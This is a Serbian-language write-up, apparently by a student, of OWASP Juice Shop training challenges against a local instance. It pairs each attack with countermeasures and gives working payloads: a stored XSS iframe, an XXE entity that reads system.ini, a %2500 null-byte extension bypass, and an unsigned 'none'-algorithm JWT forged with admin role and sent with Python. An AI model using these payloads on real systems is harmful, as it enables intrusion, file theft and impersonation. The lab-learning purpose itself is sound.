## 1) Persisted XSS

**Назив изазова у апликацији**: **Client-side XSS Protection** `***`

**Класа напада**: Arbitrary code execution

**Утицај**: Било би могуће чувати злонамерне скрипте на бекенду (добављање приватних података, брисање података, цурење кукија, потпуно компромитовање корисника). Пошто се скрипта налази на бекенду, потенцијално сваки корисник може да је покрене.

**Рањивости**: Улаз је валидиран само у веб апликацији. Сервер прихвата улаз as-is и таквог га чува у бази података.

**Контрамере**:

1) Валидација улаза на серверу
2) Санитација escape карактера пре чувања у бази података

**Белешке**:

Кандидат за овај напад је где год постоји нека форма или неки _text input_. После мало тражења сам налетео на поље за имејл адресу у регистрацији. Наиме, валидација имејл адресе се ради само у веб апликацији.

Довољно је да заобиђем веб апликацију и обратим се бекенду директно.
Други начин је да користим интерцептор у Burp Suite-у и уметнем у имејл адресу:

```
"<iframe src\="javascript:alert('xss')\">"
```

## 2) Окачи превелик фајл

**Назив изазова у апликацији**: **Upload Size** `***`

**Класа напада**: Denial of Service / Flood Attack

**Утицај**: 
- Било би могуће послати много великих фајлова и поплавити серверов диск тако да сви наредни захтеви где се нешто уписује не прођу. 
- Писање логова не би радило како треба. 
- Ако мрежни саобраћај константно обрађује велику количину података из једног извора, неће моћи да обради остале захтеве.

**Рањивости**: Сервер не валидира улаз за величину фајлова, па је могуће заобићи клијентску валидацију.

**Контрамере**: Увести валидацију величине фајла са серверске стране.

**Белешке**:

Пријављени корисник може да поднесе жалбу у Complaint страници. Тамо се може окачити фајл. Ако је фајл већи од 100KB, захтев неће проћи јер је веб апликација урадила валидацију.

Трик је да покренем интерцептор и нађем где се шаље сам фајл. Тамо постоји `content: ...`, и све што треба да урадим је да за вредност `content` поља додам неко додатно смеће (нпр. `hf389dh9ewhf39hd32...`), тек толико да величина тог фајла буде изнад 100KB.

## 3) Добави `C:\Windows\system.ini` 

**Назив изазова у апликацији**: **XXE Data Access** `***`

**Класа напада**: SSRF

**Утицај**: Могуће је слободно се кретати по фајл систему рачунара на којем трчи
сервер. Могу се добавити тајни кључеви, шивре, логови, аналитика итд.

**Рањивости**: Употреба XML библиотеке без искључивања одређених функционалности
који по природи дозвољавају XXE напад. 

**Контрамере**: Искључити одговарајуће функционалности у XXE библиотеци (external entities).

**Белешке**:

Пише у хинту да се користи стари B2B интерфејс, што значи опет идем у Complaints.

Најобичнији XXE напад:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini">
]>
<test>
    &xxe;
</test>
```

https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files

И онда само треба да преварим веб апликацију да шаље зип (променим екстензију) а
у интерцептору вратим на xml.

## 4) Неовлашћен приступ фајловима 

**Назив изазова у апликацији**: **Misplaced Signature File** `****` и **Poison Null Byte** `****`

**Класа напада**: Злоупотреба контроле приступа

**Утицај**: Нападач може приступити фајловима које је сервер заштитио.

**Рањивости**: Лоша провера екстензије фајла.

**Контрамере**: Санитација специјалних карактера (нул). Употреба проверених библиотека.

**Белешке**:

`localhost:3000/ftp` садржи неке фајлове.

Фајл који треба да добавим је `suspicious_errors.yml` и припада `Sigma` пројекту.

Не може директно, јер је `yml` екстензија блокирана.

Трик је да се употреби poison null byte: `%00` у URL-у је нул карактер који
терминира стринг. Ми желимо:

```
localhost:3000/ftp/suspicious_errors.yml
```

а сервер жели:

```
localhost:3000/ftp/*.md
```

па га преваримо:

```
localhost:3000/ftp/suspicious_errors.yml%00.md
```

Само што не може проценат директно овако већ мора да буде escape-ован, тј. уместо
`%` се пише `%25`:

```
localhost:3000/ftp/suspicious_errors.yml%2500.md
```

## 5) Лажирај JWT

**Назив изазова у апликацији**: **Unsigned JWT** `*****`

**Класа напада**: Злоупотреба лоше аутентификације

**Утицај**: Нападач се може представити као неко други.

**Рањивости**: Користи се библиотека која дозвољава `none` алгоритам. Не форсира се одређени алгоритам при провери JWT-а.

**Контрамере**: Користити бољу библиотеку за JWT или експлицитно захтевати да се провера ради по том-и-том алгоритму.

```java
JWTVerifier verifier = JWT.require(Algorithm.HMAC256(keyHMAC)).build();
```

**Белешке**:

Преко интерцептора могу да добавим JWT када пошаљем неки захтев. Њега ћу да модификујем.
[Тражио сам](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771) како се прави _unsigned jwt_. 
JWT нуди да вредност алгоритма у заглављу
буде `none` тј. без аутентификације:

```json
{
  "typ": "JWT",
  "alg": "none"
}
```

У телу је довољно само променити имејл:

```json
{
  "status": "success",
  "data": {
    "id": 1,
    "username": "ghjghjg",
    "email": "jwtn3d@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "deluxeToken": "",
    "lastLoginIp": "127.0.0.1",
    "profileImage": "assets/public/images/uploads/defaultAdmin.png",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2024-04-01 08:16:43.007 +00:00",
    "updatedAt": "2024-04-01 09:14:30.336 +00:00",
    "deletedAt": null
  },
  "iat": 1711963175
}
```

а последњу секцију, везану за криптографију, се брише.

Када се ово енкодира у base64, избаци `=` и дода тачка на крају сваке секције,
добијемо JWT:

```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogImdoamdoamciLAogICAgImVtYWlsIjogImp3dG4zZEBqdWljZS1zaC5vcCIsCiAgICAicGFzc3dvcmQiOiAiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLAogICAgInJvbGUiOiAiYWRtaW4iLAogICAgImRlbHV4ZVRva2VuIjogIiIsCiAgICAibGFzdExvZ2luSXAiOiAiMTI3LjAuMC4xIiwKICAgICJwcm9maWxlSW1hZ2UiOiAiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA4OjE2OjQzLjAwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA5OjE0OjMwLjMzNiArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNzExOTYzMTc1Cn0.
```

И сад само пошаљем захтев са лажираним JWT-ом:

```py
import requests

fake_jwt = 'ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJzdGF0dXMiOiAic3VjY2VzcyIsCiAgImRhdGEiOiB7CiAgICAiaWQiOiAxLAogICAgInVzZXJuYW1lIjogImdoamdoamciLAogICAgImVtYWlsIjogImp3dG4zZEBqdWljZS1zaC5vcCIsCiAgICAicGFzc3dvcmQiOiAiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLAogICAgInJvbGUiOiAiYWRtaW4iLAogICAgImRlbHV4ZVRva2VuIjogIiIsCiAgICAibGFzdExvZ2luSXAiOiAiMTI3LjAuMC4xIiwKICAgICJwcm9maWxlSW1hZ2UiOiAiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0QWRtaW4ucG5nIiwKICAgICJ0b3RwU2VjcmV0IjogIiIsCiAgICAiaXNBY3RpdmUiOiB0cnVlLAogICAgImNyZWF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA4OjE2OjQzLjAwNyArMDA6MDAiLAogICAgInVwZGF0ZWRBdCI6ICIyMDI0LTA0LTAxIDA5OjE0OjMwLjMzNiArMDA6MDAiLAogICAgImRlbGV0ZWRBdCI6IG51bGwKICB9LAogICJpYXQiOiAxNzExOTYzMTc1Cn0.'

respo = requests.get(
    "http://localhost:3000/api/Users",
    headers={
        'Authorization': f"Bearer {fake_jwt}"
    }
)
```